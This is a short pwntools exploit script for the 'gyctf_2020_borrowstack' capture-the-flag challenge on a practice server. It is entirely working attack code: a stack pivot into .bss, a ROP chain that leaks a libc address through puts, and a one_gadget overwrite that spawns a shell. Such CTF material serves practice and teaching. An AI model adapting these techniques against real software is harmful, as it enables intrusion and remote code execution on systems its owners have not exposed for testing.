from pwn import *

#context.log_level = 'debug'

#p = process('./gyctf_2020_borrowstack')
p = remote('node4.buuoj.cn', 25342)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')

elf = ELF('gyctf_2020_borrowstack')

puts_plt = elf.plt['puts']
read_got = elf.got['read']
ret = 0x4004c9
main = elf.sym['main']

#gdb.attach(p, 'b *0x400676')

bank = 0x601080 + 0xa0
leave = 0x400699
pop_rdi_ret = 0x400703

one_gadget = 0x4526a

payload = b'a' * ( 0x60 ) + p64(bank) + p64(leave)
payload2 = b'a' * (0x8 + 0xa0 ) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(main)

p.sendafter(b'\n', payload)
p.sendafter(b'\n', payload2)

read_real_addr = u64(p.recv(6).ljust(8, b'\0'))
libc_base = read_real_addr - libc.sym['read']

print('[+] libc_base -> {}'.format(hex(libc_base)))

one_gadget = one_gadget + libc_base

payload = b'a' * ( 0x60 + 8 ) + p64(one_gadget)
p.send(payload)
p.send(b'QAQ')

p.interactive()
